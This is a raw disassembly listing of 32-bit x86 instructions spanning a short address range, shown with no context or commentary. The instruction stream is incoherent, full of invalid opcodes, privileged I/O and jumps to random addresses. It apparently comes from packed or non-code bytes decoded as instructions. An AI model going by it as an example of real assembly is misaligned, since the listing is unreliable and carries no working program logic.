  412a2d:	imul   ebp,DWORD PTR [eax+0x25521396],0x14
  412a34:	sub    ch,BYTE PTR [ebp+edi*4+0x5b6f957e]
  412a3b:	jmp    0xb3b404b5
  412a40:	mov    ch,0x76
  412a42:	out    0x25,al
  412a44:	push   ds
  412a45:	inc    ebx
  412a46:	add    edx,edx
  412a48:	std    
  412a49:	adc    esi,DWORD PTR [edi-0xa]
  412a4c:	dec    ebp
  412a4d:	je     0x412a2d
  412a4f:	or     eax,0xd331ac32
  412a54:	mov    dh,0x25
  412a56:	lahf   
  412a57:	ret    0x4dd
  412a5a:	ret    0x4ed1
  412a5d:	dec    edi
  412a5e:	fbld   TBYTE PTR [eax-0x11209e78]
  412a64:	imul   esp,DWORD PTR [ecx-0x50356c84],0xffffff8e
  412a6b:	mov    ds:0x2c9afd2,al
  412a70:	dec    ecx
  412a71:	sbb    BYTE PTR [edi-0x4e2cfbcd],bh
  412a77:	cwde   
  412a78:	push   ss
  412a79:	cwde   
  412a7a:	or     BYTE PTR [edi+ecx*8],ah
  412a7d:	sub    al,0x12
  412a7f:	hlt    
  412a80:	out    0xbe,eax
  412a82:	push   edx
  412a83:	sub    DWORD PTR [ebx],0xffffffa9
  412a86:	push   eax
  412a87:	mov    al,ds:0x344dd94
  412a8c:	xchg   bh,ah
  412a8e:	adc    al,0xe9
  412a90:	mul    ecx
  412a92:	aaa    
  412a93:	xchg   ebx,eax
  412a94:	and    al,BYTE PTR [esi+0x3d]
  412a97:	push   es
  412a98:	mov    al,ds:0xdc12463a
  412a9d:	xor    bl,al
  412a9f:	dec    ecx
  412aa0:	sahf   
  412aa1:	pop    ss
  412aa2:	fisubr DWORD PTR [ecx-0x65dbb960]
  412aa8:	stos   DWORD PTR es:[edi],eax
  412aa9:	push   ds
  412aaa:	iret   
  412aab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412aac:	cmp    ebx,ebx
  412aae:	add    al,0xc9
  412ab0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ab1:	(bad)  
  412ab2:	cld    
  412ab3:	xor    DWORD PTR [eax],0xffffffe9
  412ab6:	jmp    0x412a5b
  412ab8:	inc    ebx
  412ab9:	push   ds
  412aba:	sub    BYTE PTR [edx+0x37acf6ee],dh
  412ac0:	sbb    al,0xa9
  412ac2:	retfw  0x8ea
  412ac6:	ja     0x412a95
  412ac8:	jp     0x412ac5
  412aca:	dec    esp
  412acb:	pop    esp
  412acc:	and    DWORD PTR [esi-0xbd27768],ebx
  412ad2:	call   0x584d8e50
  412ad7:	dec    edx
  412ad8:	scas   al,BYTE PTR es:[edi]
  412ad9:	mov    dh,0xcd
  412adb:	or     esp,DWORD PTR [ebp+eiz*8+0x37]
  412adf:	scas   al,BYTE PTR es:[edi]
  412ae0:	pop    ds
  412ae1:	sar    ebp,1
  412ae3:	add    dl,cl
  412ae5:	mov    eax,ds:0x62e1368c
  412aea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412aeb:	cs lock js 0x412af6
  412aef:	(bad)  
  412af0:	push   esi
  412af1:	retf   
  412af2:	xor    eax,0xf37fb519
  412af7:	jp     0x412a9d
  412af9:	add    al,0xa5
  412afb:	(bad)
  412afe:	mov    ch,0xf
  412b00:	(bad)  
  412b01:	jne    0x412b70
  412b03:	scas   eax,DWORD PTR es:[edi]
  412b04:	jb     0x412ad0
  412b06:	into   
  412b07:	add    BYTE PTR [esi+0x2d],dh
  412b0a:	inc    edi
  412b0b:	xlat   BYTE PTR ds:[ebx]
  412b0c:	popa   
  412b0d:	jg     0x412b4f
  412b0f:	lds    esi,FWORD PTR [ebp-0x60]
  412b12:	push   esp
  412b13:	jns    0x412ab6
  412b15:	mov    ebx,0x20f463b5
  412b1a:	gs jmp 0x412ae5
  412b1d:	fisttp QWORD PTR ss:[edi+0x1eddad7c]
  412b24:	add    ah,BYTE PTR [eax+0x648048b9]
  412b2a:	outs   dx,BYTE PTR ds:[esi]
  412b2b:	mov    eax,gs:0x9e4744c0
  412b31:	aad    0xaa
  412b33:	jne    0x412b1d
  412b35:	add    DWORD PTR [eax],esp
  412b37:	(bad)  
  412b38:	out    0xd8,al
  412b3a:	xchg   edi,eax
  412b3b:	hlt    
  412b3c:	mov    ebp,0x10099594
  412b41:	lock push edx
  412b43:	sub    BYTE PTR [ecx],ch
  412b45:	in     eax,dx
  412b46:	sub    edi,DWORD PTR [eax-0x4d49cfce]
  412b4c:	add    ecx,DWORD PTR [ecx-0x163a5159]
  412b52:	outs   dx,BYTE PTR ds:[esi]
  412b53:	test   DWORD PTR ds:0x7574e7ec,esp
  412b59:	dec    ecx
  412b5a:	mov    edi,DWORD PTR [edx+edx*8]
  412b5d:	mov    ds:0xb0b6c05c,eax
  412b62:	imul   eax,DWORD PTR [ebx],0x63d58570
  412b68:	rol    DWORD PTR [edi],0xa7
  412b6b:	sub    DWORD PTR [ebx+0x3cdac33],edi
  412b71:	call   0x46b7:0x4069
  412b77:	sti    
  412b78:	push   0x66
  412b7a:	jmp    0x412b0c
  412b7c:	cmp    BYTE PTR [eax],ah
  412b7e:	pop    esp
  412b7f:	(bad)  
  412b81:	sahf   
  412b82:	sbb    dl,BYTE PTR [ebp-0xfcec443]
  412b88:	xor    esp,ecx
  412b8a:	sbb    eax,0xdf5c3bde
  412b8f:	into   
  412b90:	retf   0xb806
  412b93:	mov    eax,ds:0xef782e29
  412b98:	out    0x42,al
  412b9a:	cld    
  412b9b:	xchg   esp,eax
  412b9c:	mov    ecx,0xb1122038
  412ba1:	loope  0x412b3d
  412ba3:	cmp    dh,BYTE PTR [ebx-0x5f28a4]
  412ba9:	push   ebp
  412baa:	pop    ebx
  412bab:	popf   
  412bac:	cli    
  412bad:	sub    bl,bl
  412baf:	mov    BYTE PTR [edi+ebp*2-0x80],bh
  412bb3:	xlat   BYTE PTR gs:[ebx]
  412bb5:	dec    BYTE PTR [ebx+0x525e712f]
  412bbb:	loope  0x412b67
  412bbd:	jnp    0x412c26
  412bbf:	jl     0x412b75
  412bc1:	or     ecx,esi
  412bc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bc4:	ja     0x412b4e
  412bc6:	add    al,0xcc
  412bc8:	pop    eax
  412bc9:	div    BYTE PTR [ebx+edi*2-0x61bd965a]
  412bd0:	test   BYTE PTR ds:0x760cc5b2,0x47
  412bd7:	xor    ah,BYTE PTR [esi-0x30]
  412bda:	lds    ebx,FWORD PTR [eax-0x3d]
  412bdd:	add    eax,0x22cc3e3a
  412be2:	adc    bl,BYTE PTR [ebx-0x22]
  412be5:	push   edx
  412be6:	(bad)  
  412be7:	nop
  412be8:	dec    ebp
  412be9:	adc    bh,dl
  412beb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bec:	sbb    DWORD PTR [ecx],edx
  412bee:	dec    ecx
  412bef:	rol    BYTE PTR [esi+0x3f],1
  412bf2:	mov    bh,0x11
  412bf4:	cmp    edx,DWORD PTR [esi-0x611cb58c]
  412bfa:	mov    ah,0x72
  412bfc:	in     eax,0x83
  412bfe:	pop    edi
  412bff:	scas   eax,DWORD PTR es:[edi]
  412c00:	pop    esp
  412c01:	das    
  412c02:	pop    ss
  412c03:	cmp    DWORD PTR [ecx],edi
  412c05:	push   ss
  412c06:	ins    BYTE PTR es:[edi],dx
  412c07:	cmp    DWORD PTR [eax+edx*2-0x34],ebx
  412c0b:	leave  
  412c0c:	in     eax,dx
  412c0d:	rol    DWORD PTR [esi+0x62150c60],0x6c
  412c14:	add    BYTE PTR cs:[ebx+0x20],dh
  412c18:	ins    BYTE PTR es:[edi],dx
  412c19:	leave  
  412c1a:	push   ebp
  412c1b:	sbb    eax,0x434f283c
  412c20:	jmp    DWORD PTR [edx+0x1b7ab921]
  412c26:	fs jmp 0x7ed7:0x645c3e7b
  412c2e:	scas   al,BYTE PTR es:[edi]
  412c2f:	push   edx
  412c30:	mov    WORD PTR [ebp+0x5ecd31bc],es
  412c36:	mov    ds:0x8370f525,eax
  412c3b:	push   0xb928cd45
  412c40:	pushf  
  412c41:	push   eax
  412c42:	enter  0x199b,0xf6
  412c46:	pop    ecx
  412c47:	sub    eax,0x29a90672
  412c4c:	sbb    edi,esi
  412c4e:	gs es inc ebp
  412c51:	pop    ss
  412c52:	mov    cl,0x5c
  412c54:	inc    ebp
  412c55:	ds push edi
  412c57:	mov    bh,0x3f
  412c59:	xchg   ecx,eax
  412c5a:	test   BYTE PTR [ebx+ebx*4+0xdfbed38],dh
  412c61:	pop    edi
  412c62:	xor    ecx,DWORD PTR [esi+eax*4+0x407df166]
  412c69:	add    al,0x82
  412c6b:	cli    
  412c6c:	(bad)  
  412c6d:	mov    ds,edi
  412c6f:	xchg   edi,eax
  412c70:	scas   al,BYTE PTR es:[edi]
  412c71:	adc    ecx,ebp
  412c73:	cld    
  412c74:	test   DWORD PTR [ebx-0x4c],esi
  412c77:	lds    edx,FWORD PTR [bp-0x33]
  412c7b:	push   edx
  412c7c:	cld    
  412c7d:	mov    es,esi
  412c7f:	cdq    
  412c80:	dec    ebp
  412c81:	rol    DWORD PTR [esi-0x6a],1
  412c84:	call   0x5483:0x9af9a47e
  412c8b:	ins    DWORD PTR es:[edi],dx
  412c8c:	add    ecx,edx
  412c8e:	mov    ds:0x6b8b5218,eax
  412c93:	minps  xmm1,xmm3
  412c96:	mov    eax,0x89462f29
  412c9b:	mov    bh,0x4
  412c9d:	sub    cl,BYTE PTR [edx+0x61]
  412ca0:	ja     0x412cb4
  412ca2:	xchg   esi,eax
  412ca3:	je     0x412d00
  412ca5:	inc    edi
  412ca6:	sbb    al,bl
  412ca8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ca9:	test   BYTE PTR [ecx],0xb0
  412cac:	adc    ebp,DWORD PTR [esi+0x40]
  412caf:	sub    edx,edi
  412cb1:	inc    esi
  412cb2:	fisttp DWORD PTR [eax+0x58e6d4db]
  412cb8:	out    dx,al
  412cb9:	lds    edi,FWORD PTR [ecx+0x59fb9a43]
  412cbf:	lods   eax,DWORD PTR ds:[esi]
  412cc0:	inc    ebp
  412cc1:	add    DWORD PTR [esi],ebp
  412cc3:	icebp  
  412cc4:	lods   eax,DWORD PTR ds:[esi]
  412cc5:	aad    0x90
  412cc7:	aas    
  412cc8:	leave  
  412cc9:	push   es
  412cca:	retf   0x66ea
  412ccd:	das    
  412cce:	stos   DWORD PTR es:[di],eax
  412cd0:	aam    0xbb
  412cd2:	add    ebp,DWORD PTR [edx+0x2a]
  412cd5:	or     BYTE PTR [edi-0x7f8a8993],ch
  412cdb:	pop    esi
  412cdc:	lea    edi,gs:[edi-0x3e]
  412ce0:	fisttp WORD PTR [eax+0x41]
  412ce3:	mov    DWORD PTR [esi+0x799db9a1],esi
  412ce9:	xchg   ebx,eax
  412cea:	fadd   st,st(7)
  412cec:	ret    0xb3bf
  412cef:	inc    edi
  412cf1:	hlt    
  412cf2:	adc    BYTE PTR [edi-0xdcefb9d],al
  412cf8:	addr16 jb 0x412d52
  412cfb:	jl     0x412d62
  412cfd:	add    DWORD PTR [edi],ecx
  412cff:	xor    DWORD PTR [edx],esi
  412d01:	fcomi  st,st(6)
  412d03:	dec    edi
  412d04:	adc    DWORD PTR [edx-0x241bba35],edx
  412d0a:	(bad)  
  412d0b:	xor    al,0x21
  412d0d:	sahf   
  412d0e:	push   edi
  412d0f:	push   ss
  412d10:	push   ds
  412d11:	xor    ch,al
  412d13:	sti    
  412d14:	push   ss
  412d15:	hlt    
  412d16:	mov    ch,BYTE PTR [esi-0x55]
  412d19:	add    dl,BYTE PTR [edi]
  412d1b:	push   0xfffffff3
  412d1d:	mov    ah,BYTE PTR [ebx]
  412d1f:	mov    ebx,0xd1eba361
  412d24:	aas    
  412d25:	adc    DWORD PTR [ecx],esi
  412d27:	mov    cl,0x8a
  412d29:	pop    eax
  412d2a:	test   dh,0x8
  412d2d:	call   0x2156:0xb8aeb35e
  412d34:	push   ebp
  412d35:	scas   eax,DWORD PTR es:[edi]
  412d36:	loop   0x412d66
  412d38:	jno    0x412d64
  412d3a:	not    eax
  412d3c:	call   0x4124f98c
  412d41:	mov    BYTE PTR [ebp-0x3cb47e12],ch
  412d47:	mov    ds:0x8533f80,eax
  412d4c:	aad    0x86
  412d4e:	call   0xce1b8022
  412d53:	sub    BYTE PTR [ebp+0x46],0x62
  412d57:	and    BYTE PTR [ecx-0x2129901b],0xa2
  412d5e:	loopne 0x412ddc
  412d60:	push   0xffffffce
  412d62:	call   0xa20befbb
  412d67:	dec    esi
  412d68:	mov    ebx,0x6aba1050
  412d6d:	and    eax,0x4f463090
  412d72:	popf   
  412d73:	mul    DWORD PTR [ebx-0xfc0578e]
  412d79:	loopne 0x412d23
  412d7b:	arpl   WORD PTR [ebx+0x4e],bp
  412d7e:	into   
  412d7f:	adc    DWORD PTR [ebp+0x47],0xd
  412d83:	jl     0x412d8a
  412d85:	jecxz  0x412df1
  412d87:	and    dl,BYTE PTR [ebx]
  412d89:	push   edi
  412d8a:	cld    
  412d8b:	adc    BYTE PTR [edi],dh
  412d8d:	es inc esp
  412d8f:	int    0x43
  412d91:	mov    ch,0x6e
  412d93:	sub    DWORD PTR [edi],eax
  412d95:	test   DWORD PTR [ebp-0x59127f1f],ebx
  412d9b:	xor    eax,0x588b7dc0
  412da0:	out    dx,eax
  412da1:	or     eax,0x34864e12
  412da6:	inc    edx
  412da7:	mov    ss,WORD PTR [edi]
  412da9:	adc    dl,BYTE PTR [eax-0x58]
  412dac:	xor    BYTE PTR [ebx],dh
  412dae:	or     BYTE PTR [ebp+0x32350ad5],bh
  412db4:	ror    DWORD PTR [ebx],0x2d
  412db7:	sar    BYTE PTR [ecx+0x39],0xe1
  412dbb:	popa   
  412dbc:	aas    
  412dbd:	shl    DWORD PTR [edi],1
  412dbf:	jnp    0x412dd6
  412dc1:	into   
  412dc2:	xchg   esi,eax
  412dc3:	nop
  412dc4:	mov    al,ds:0x2f07f93
  412dc9:	hlt    
  412dca:	mov    bh,0xc
  412dcc:	cmp    BYTE PTR [ebx-0xad7f399],ah
  412dd2:	sub    al,0xc1
  412dd4:	daa    
  412dd5:	ss mov eax,0x81a6269
  412ddb:	popf   
  412ddc:	pusha  
  412ddd:	push   ss
  412dde:	xor    al,0x3d
  412de0:	cmp    DWORD PTR [esi],edi
  412de2:	push   esp
  412de3:	mov    eax,0xbd74d93c
  412de8:	leave  
  412de9:	mov    ebx,0x17f73ee1
  412dee:	jmp    0x8e811a2b
  412df3:	adc    eax,0x756af437
  412df8:	sub    al,0xc8
  412dfa:	js     0x412dd2
  412dfc:	mov    bh,0x32
  412dfe:	push   cs
  412dff:	mov    al,ds:0x5fce7848
  412e04:	push   cs
  412e05:	push   ecx
  412e06:	cmp    al,0x38
  412e08:	call   0x33b78f76
  412e0d:	aad    0xdb
  412e0f:	xchg   ecx,eax
  412e10:	add    cl,BYTE PTR [ebp-0x65]
  412e13:	and    ebx,ebx
  412e15:	scas   al,BYTE PTR es:[edi]
  412e16:	test   eax,0x7cf35475
  412e1b:	cdq    
  412e1c:	mov    al,ds:0x850a7d66
  412e21:	mov    cl,0x8b
  412e23:	je     0x412dcf
  412e25:	push   esi
  412e26:	mov    dh,0xc
  412e28:	lea    ebp,[ebp-0x5eb6b0b0]
  412e2e:	aad    0x69
  412e30:	test   DWORD PTR [edx-0x50],esi
  412e33:	(bad)  
  412e34:	push   ss
  412e35:	frstor [eax+ecx*2-0x12]
  412e39:	mov    ah,0x8a
  412e3b:	out    dx,al
  412e3c:	rol    BYTE PTR [eax-0x398b17b1],1
  412e42:	ss gs ins BYTE PTR es:[edi],dx
  412e45:	push   edx
  412e46:	faddp  st(7),st
  412e48:	adc    eax,0x9a92f245
  412e4d:	pop    edi
  412e4e:	ins    BYTE PTR es:[edi],dx
  412e4f:	(bad)  [ecx-0x61505178]
  412e55:	jo     0x412e10
  412e57:	pop    ss
  412e58:	xor    DWORD PTR [ecx-0x7e353fab],0x4d0667dd
  412e62:	nop
  412e63:	add    DWORD PTR [esi],esp
  412e65:	pop    es
  412e66:	or     dh,BYTE PTR [ebx+0x28]
  412e69:	rol    DWORD PTR ds:0x155d40aa,cl
  412e6f:	mov    bh,0x18
  412e71:	lock adc ecx,ebx
  412e74:	dec    ecx
  412e75:	stos   DWORD PTR es:[edi],eax
  412e76:	or     al,0xff
  412e78:	lods   eax,DWORD PTR ds:[esi]
  412e79:	call   0x85b950c4
  412e7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e7f:	mov    ecx,0xd90e421e
  412e84:	call   FWORD PTR [edi-0x7710f262]
  412e8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e8b:	inc    esi
  412e8c:	(bad)  [ebx+0x2bb1d160]
  412e92:	inc    ebx
  412e93:	xchg   ecx,eax
  412e94:	mov    edx,0x71c7de3a
  412e99:	or     edx,0x5
  412e9c:	inc    esp
  412e9d:	push   ebp
  412e9e:	sub    eax,0x453fe488
  412ea3:	sub    al,0xcc
  412ea5:	push   ebx
  412ea6:	and    ch,0xc2
  412ea9:	add    al,dl
  412eab:	lahf   
  412eac:	and    al,0xc9
  412eae:	mov    ebx,eax
  412eb0:	push   esp
  412eb1:	jg     0x412ef4
  412eb3:	enter  0x14ab,0xcf
  412eb7:	xor    eax,0xdd920df2
  412ebc:	and    esp,edi
  412ebe:	(bad)  
  412ebf:	mov    eax,ds:0xd6ddcd7b
  412ec4:	push   ecx
  412ec5:	(bad)  [esi]
  412ec7:	xchg   edi,eax
  412ec8:	jae    0x412eea
  412eca:	inc    ebx
  412ecc:	adc    bh,BYTE PTR [ecx]
  412ece:	or     esi,DWORD PTR [edi]
  412ed0:	cmp    edi,DWORD PTR gs:[ebp-0x11]
  412ed4:	push   edx
  412ed5:	sbb    eax,0xb7f4f5d9
  412eda:	rcr    BYTE PTR [ecx+0x12],0x7a
  412ede:	mov    al,0xa
  412ee0:	or     esi,DWORD PTR [ecx+0x4c2e7b94]
  412ee6:	sub    BYTE PTR [esi-0x48470bea],ch
  412eec:	mov    cl,0x49
  412eee:	stc    
  412eef:	xchg   ebp,eax
  412ef0:	mov    edx,0x6b9314b4
  412ef5:	enter  0x44c3,0xad
  412ef9:	call   0x6644ea3
  412efe:	rol    BYTE PTR [edi+0x7b2ef90c],0x25
  412f05:	lea    edi,[ebx+0x7433e774]
  412f0b:	mov    ebp,edi
  412f0d:	aaa    
  412f0e:	xor    DWORD PTR [edi+0x42729ca3],ebp
  412f14:	shr    DWORD PTR [esp+ecx*4],cl
  412f17:	arpl   WORD PTR [eax-0x60],ax
  412f1a:	mov    eax,ds:0x4dc633c6
  412f1f:	sub    al,0x13
  412f21:	cmp    ecx,esp
  412f23:	jo     0x412f0c
  412f25:	(bad)  
  412f26:	mov    cl,0x13
  412f28:	lds    eax,FWORD PTR [eax]
  412f2a:	xchg   ebp,eax
  412f2b:	mov    bh,0x70
  412f2d:	rcr    DWORD PTR [edi],0x67
  412f30:	push   0xe9b86f20
  412f35:	mov    ebx,0x2335e707
  412f3a:	push   cs
  412f3b:	sti    
  412f3c:	xchg   BYTE PTR [ebx+0x4d],bl
  412f3f:	xchg   ebx,eax
  412f40:	fldenv [ebx+ebp*1+0x41]
  412f44:	(bad)  
  412f45:	xchg   ecx,eax
  412f46:	or     DWORD PTR [ecx-0x34d7fb42],ecx
  412f4c:	adc    eax,0x33ec17ba
  412f51:	shr    DWORD PTR [edx-0x62],0xa5
  412f55:	shl    BYTE PTR ds:0xd60c63e7,1
  412f5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f5c:	push   esp
  412f5d:	fidivr DWORD PTR [ebx+0x37711cb9]
  412f63:	fbld   TBYTE PTR [esi]
  412f65:	stos   DWORD PTR es:[edi],eax
  412f66:	ror    DWORD PTR [edx],1
  412f68:	add    ecx,ecx
  412f6a:	mov    al,0x56
  412f6c:	mov    ah,0x2a
  412f6e:	pop    ebp
  412f6f:	scas   eax,DWORD PTR es:[edi]
  412f70:	jge    0x412f93
  412f72:	sub    esp,DWORD PTR [ecx-0x35faf703]
  412f78:	mov    esi,0x4635a7a4
  412f7d:	mov    ebp,0x2f840055
  412f82:	adc    al,0x4
  412f84:	aaa    
  412f85:	jg     0x412f1f
  412f87:	sbb    eax,0xdabe2813
  412f8c:	cmp    BYTE PTR [eax-0x69cb0dfe],ch
  412f92:	mov    ?,WORD PTR [ebp+0x1d6eaf2c]
  412f98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f99:	xor    ch,BYTE PTR [ebp-0x6c]
  412f9c:	jns    0x41300a
  412f9e:	cmp    edx,edx
  412fa0:	push   ebp
  412fa1:	lea    ebp,[edx]
  412fa3:	mov    bh,0x52
  412fa5:	stc    
  412fa6:	shl    DWORD PTR [edx],1
  412fa8:	xchg   esi,eax
  412fa9:	cmp    ebp,DWORD PTR [ebx]
  412fab:	fidivr WORD PTR [ebx-0x4735f21f]
  412fb1:	or     bh,BYTE PTR [ebp-0x24]
  412fb4:	setbe  dh
  412fb7:	pop    edx
  412fb8:	jmp    0x412f66
  412fba:	outs   dx,DWORD PTR ds:[esi]
  412fbb:	pop    esp
  412fbc:	ja     0x412f8f
  412fbe:	out    dx,al
  412fbf:	pop    edi
  412fc0:	ret    0x1b2c
  412fc3:	pusha  
  412fc4:	ins    BYTE PTR es:[edi],dx
  412fc5:	ja     0x41301a
  412fc7:	mov    ds:0x17a263be,al
  412fcc:	inc    ebp
  412fcd:	lahf   
  412fce:	pop    ss
  412fcf:	or     DWORD PTR [esi],edi
  412fd1:	mov    ebp,0xe5d5354
  412fd6:	push   eax
  412fd7:	sbb    DWORD PTR [edx],esp
  412fd9:	xchg   DWORD PTR [edi+0x5275c8cc],ebx
  412fdf:	shr    BYTE PTR [ecx],cl
  412fe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fe2:	fisubr WORD PTR [esi-0xe]
  412fe5:	pop    ds
  412fe6:	test   DWORD PTR [eax],esi
  412fe8:	(bad)
  412feb:	ds inc esi
  412fee:	stos   DWORD PTR es:[edi],eax
  412fef:	mov    ebp,0x8b93e2fa
  412ff4:	(bad)  [si-0x1e]
  412ff8:	ss cmc 
  412ffa:	data16 jg 0x412fc0
  412ffd:	in     al,dx
  412ffe:	and    BYTE PTR [ebx+0x41],ah
  413001:	jl     0x412ffe
  413003:	adc    DWORD PTR [edi-0x211ce698],edi
  413009:	inc    eax
  41300a:	popf   
  41300b:	addr16 call 0xeba891ae
  413011:	mov    bl,0xb0
  413013:	mov    ebx,0xd12086cb
  413018:	jecxz  0x412fb9
  41301a:	cs loope 0x413081
  41301d:	pop    esi
  41301e:	cmc    
  41301f:	mov    al,0x6f
  413021:	or     eax,0x564e8a4a
  413026:	(bad)  
  413027:	loopne 0x413024
  413029:	pop    ds
  41302a:	sbb    eax,0xffffffc6
  41302d:	enter  0x214f,0xda
  413031:	xor    ch,cl
  413033:	pop    edi
  413034:	inc    ebx
  413035:	aam    0x90
  413037:	xor    eax,0x4651ceb3
  41303c:	dec    esi
  41303d:	and    eax,0x4142b364
  413042:	xchg   edi,eax
  413043:	xor    cl,BYTE PTR [esi+0x27]
  413046:	sbb    cl,BYTE PTR [ebp-0x68]
  413049:	adc    eax,0xbc67c66a
  41304e:	sbb    eax,0xc2da0f59
  413053:	call   DWORD PTR [edx+0x34c2962d]
  413059:	dec    esi
  41305a:	push   es
  41305b:	fmul   st(0),st
  41305d:	arpl   WORD PTR [edi+0x37],bp
  413060:	bound  esi,QWORD PTR [ebx]
  413062:	pop    ebp
  413063:	call   0x9227:0xd22a6586
  41306a:	adc    DWORD PTR [esi-0x18],esp
  41306d:	aam    0x80
  41306f:	adc    al,0x49
  413071:	leave  
  413072:	jecxz  0x4130ed
  413074:	adc    bh,BYTE PTR [eax]
  413076:	mov    ch,0xfa
  413078:	sub    eax,0xba2b51b9
  41307d:	in     eax,dx
  41307e:	scas   al,BYTE PTR es:[edi]
  41307f:	mov    dh,BYTE PTR [ecx]
  413081:	inc    esi
  413082:	mov    bh,0xfa
  413084:	sub    DWORD PTR [edi-0x3],0x695b59e5
  41308b:	test   DWORD PTR ds:[ecx+0x2c],esp
  41308f:	and    BYTE PTR [ecx+ebx*4+0x4ecac1dd],0xd5
  413097:	fbld   TBYTE PTR [esi+0x7db200a3]
  41309d:	xchg   DWORD PTR [ebp+0x5d],edx
  4130a0:	inc    ecx
  4130a1:	and    dl,BYTE PTR gs:[edi+0x42e9df69]
  4130a8:	not    DWORD PTR [ecx]
  4130aa:	lods   al,BYTE PTR ds:[esi]
  4130ab:	jns    0x413047
  4130ad:	ins    DWORD PTR es:[edi],dx
  4130ae:	dec    edi
  4130af:	clc    
  4130b0:	repz pop edi
  4130b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130b4:	call   0x3857a8e5
  4130b9:	retf   
  4130ba:	jo     0x41309e
  4130bc:	cmc    
  4130bd:	mov    eax,0x96148b4
  4130c2:	jae    0x413106
  4130c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130c5:	pop    es
  4130c6:	call   0x8278e4c6
  4130cb:	pop    ebx
  4130cc:	mov    dh,0xc8
  4130ce:	pop    edx
  4130cf:	pushf  
  4130d0:	pop    ebx
  4130d1:	test   al,0x5c
  4130d3:	jecxz  0x4130da
  4130d5:	and    DWORD PTR [eax-0x56],0x98043221
  4130dc:	sbb    ebx,ecx
  4130de:	inc    edi
  4130df:	push   0x348854da
  4130e4:	and    eax,DWORD PTR [eax-0x6e]
  4130e7:	and    al,0xdd
  4130e9:	imul   esp,DWORD PTR [edx-0x141f52a8],0x17
  4130f0:	iret   
  4130f1:	jp     0x413129
  4130f3:	aas    
  4130f4:	mov    ebx,0xe5b6ed4
  4130f9:	add    BYTE PTR [edx+0x1ad370fa],0xe6
  413100:	mov    ah,0x76
  413102:	int3   
  413103:	arpl   cx,sp
  413105:	dec    esp
  413106:	cmp    BYTE PTR [ecx],ah
  413108:	lsl    esi,WORD PTR [edi-0x49d130e9]
  41310f:	shl    DWORD PTR [edx],0xa2
  413112:	push   ebx
  413113:	cmp    ecx,ebp
  413115:	pushf  
  413116:	fild   QWORD PTR [ebx+0x43]
  413119:	add    al,0x25
  41311b:	stos   BYTE PTR es:[edi],al
  41311c:	in     al,0x85
  41311e:	stos   DWORD PTR es:[edi],eax
  41311f:	addr16 jo 0x4130a7
  413122:	addr16 push edx
  413124:	sub    dl,BYTE PTR [ebx+0x70]
  413127:	or     edx,DWORD PTR [eax+0x4f]
  41312a:	push   ss
  41312b:	loopne 0x41316c
  41312d:	cmp    DWORD PTR [eax],esp
  41312f:	mov    cl,0xd5
  413131:	dec    ecx
  413132:	cmp    edi,esp
  413134:	loopne 0x4130d7
  413136:	fmul   QWORD PTR [ebx+0x17b36f9d]
  41313c:	and    eax,0x9eebbe24
  413141:	daa    
  413142:	mov    ah,0x23
  413144:	dec    esi
  413145:	pop    esp
  413146:	and    dl,ah
  413148:	push   esp
  413149:	mov    DWORD PTR [edi-0x2e],ebx
  41314c:	mov    ah,0x77
  41314e:	jmp    0x1b80:0xc1f41b61
  413155:	iret   
  413156:	xor    eax,0xe1749f35
  41315b:	mov    bl,0x9a
  41315d:	(bad)  
  41315e:	inc    esi
  41315f:	add    DWORD PTR [edi-0x7530559e],esp
  413165:	ins    BYTE PTR es:[edi],dx
  413166:	adc    edx,DWORD PTR [edi]
  413168:	mov    DWORD PTR [edi+0x14890b44],edx
  41316e:	mov    WORD PTR [esi+0x5b],es
  413171:	xlat   BYTE PTR ds:[ebx]
  413172:	sahf   
  413173:	mov    al,ds:0x5ab66d49
  413178:	mov    ch,0xe
  41317a:	xor    DWORD PTR [edi+0x6f],0xffffffdc
  41317e:	(bad)  
  41317f:	adc    BYTE PTR [edx-0x80],cl
  413182:	jae    0x413130
  413184:	sti    
  413185:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413186:	push   ecx
  413187:	rcl    DWORD PTR [esi-0x29],1
  41318a:	push   ebx
  41318b:	dec    ecx
  41318c:	jmp    0xf129:0x6754a18d
  413193:	sub    al,bh
  413195:	(bad)  
  413196:	out    0x12,al
  413198:	or     DWORD PTR [ebx+esi*2-0x40ac6b0b],esi
  41319f:	dec    edi
  4131a0:	cli    
  4131a1:	adc    eax,0x1001917
  4131a6:	adc    al,0xe6
  4131a8:	(bad)  
  4131a9:	in     eax,0x36
  4131ab:	dec    ebp
  4131ac:	xor    bh,BYTE PTR [esi]
  4131ae:	out    dx,al
  4131af:	pop    edx
  4131b0:	pop    ecx
  4131b1:	inc    ebx
  4131b2:	retf   0x2b1b
  4131b5:	xor    eax,0x13f37ee7
  4131ba:	mov    al,ds:0xdc70fe0f
  4131bf:	xchg   edi,eax
  4131c0:	mov    al,0x21
  4131c2:	sbb    eax,0x103ad820
  4131c7:	xor    DWORD PTR [ebx+0x6f],edi
  4131ca:	push   ds
  4131cb:	dec    edx
  4131cc:	into   
  4131cd:	lahf   
  4131ce:	js     0x41319f
  4131d0:	sti    
  4131d1:	out    dx,eax
  4131d2:	rcr    BYTE PTR [edi-0x43],cl
  4131d5:	(bad)  
  4131d6:	retf   
  4131d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131d8:	sub    eax,0x4cbf3657
  4131dd:	sbb    eax,0xb6367017
  4131e2:	scas   al,BYTE PTR es:[edi]
  4131e3:	dec    esp
  4131e4:	xor    ebp,DWORD PTR [esi-0x7ba129c]
  4131ea:	stos   DWORD PTR es:[edi],eax
  4131eb:	inc    ecx
  4131ec:	dec    ecx
